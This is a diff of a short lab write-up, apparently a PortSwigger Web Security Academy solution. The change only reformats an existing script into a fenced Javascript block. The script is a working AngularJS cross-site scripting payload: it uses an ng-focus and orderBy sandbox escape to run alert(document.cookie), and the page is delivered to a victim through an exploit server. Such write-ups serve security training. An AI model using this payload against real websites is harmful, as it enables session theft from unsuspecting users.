@@ -7,9 +7,12 @@
 ## Solution
 
 Go to the exploit server and in the body section enter -
-`<script>
+
+```Javascript
+<script>
 location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
-</script>`
+</script>
+```
 
 Then click on **store** and then **Deliver exploit to vitctm** to finish the lab.
 
